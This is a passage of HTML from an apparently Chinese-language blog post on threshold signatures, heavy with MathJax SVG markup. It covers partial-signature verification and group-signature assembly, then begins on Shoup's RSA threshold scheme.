726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>计算：</p>
<script type="math/tex; mode=display">s_i=z_i+\lbrace\sum_{j=t+1}^nf_j(x_i)(\prod_{k=1,k\neq i}^t\frac{-x_k}{x_k-x_j})\rbrace m-k_i r\bmod q</script><p>将部分签名<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.178ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2730.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389, 0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(451, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1134, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1578.6, 0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(469, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2341.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>发送给签名合成者。</p>
<p>合成者收到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.68ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2952.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(500, 0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(451, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1245, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1689.6, 0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(469, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2452.6, 0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>后，通过下式验证其有效性：</p>
<script type="math/tex; mode=display">\lbrace y_i(\prod_{j=t+1}^ny_{j,i})^{\prod_{k=1,k\neq i}^t\frac{-x_k}{x_i-x_k}}\rbrace^m=r_i^r g^{s_j}\bmod p</script><p>若验证式成立，则收到的部分签名<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.68ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2952.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(500, 0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(451, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1245, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1689.6, 0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(469, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2452.6, 0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>有效。</p>
<h2 id="产生组签名"><a href="#产生组签名" class="headerlink" title="产生组签名"></a>产生组签名</h2><p>合成者确认接收到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.817ex" height="1.441ex" role="img" focusable="false" viewBox="0 -626 361 637"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></svg></mjx-container>个正确的部分签名后，计算：</p>
<script type="math/tex; mode=display">s=\sum_{i=1}^ts_i\bmod q</script><p>将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.35ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2364.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="mi" transform="translate(500, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(951, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1395.7, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(1864.7, 0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>作为消息<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 878 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>的组签名。</p>
<h2 id="验证签名"><a href="#验证签名" class="headerlink" title="验证签名"></a>验证签名</h2><p>验证者收到组签名后，验证其有效性：</p>
<script type="math/tex; mode=display">y^m=r^r g^s \bmod p</script><h2 id="每个参与者拥有的数"><a href="#每个参与者拥有的数" class="headerlink" title="每个参与者拥有的数"></a>每个参与者拥有的数</h2><script type="math/tex; mode=display">
P_1
\begin{cases}
z_1\stackrel{}{\longrightarrow} y_1\stackrel{}{\longrightarrow} y \\

f_1(x)\stackrel{x_j}{\longrightarrow} f_1(x_j){\longrightarrow} y_{1,j} \\

f_j(x_1) {\longrightarrow} y_{j,1} \\

k_1\stackrel{}{\longrightarrow} r_1 \stackrel{r_j}{\longrightarrow} r \\

\end{cases}</script><h1 id="Shoup-门限签名方案"><a href="#Shoup-门限签名方案" class="headerlink" title="Shoup 门限签名方案"></a>Shoup 门限签名方案</h1><p>RSA 体制中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="3.185ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 1407.7 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(503, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(947.7, 0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>为安全大素数，即存在大素数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="4.406ex" height="2.156ex" role="img" focusable="false" viewBox="0 -759 1947.3 953"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(503, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(747.5, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msup" transform="translate(1192.1, 0)"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(510.7, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g></g></g></svg></mjx-container>使得<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="10.874ex" height="2.156ex" role="img" focusable="false" viewBox="0 -759 4806.5 953"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(780.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1836.6, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(2336.6, 0)"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 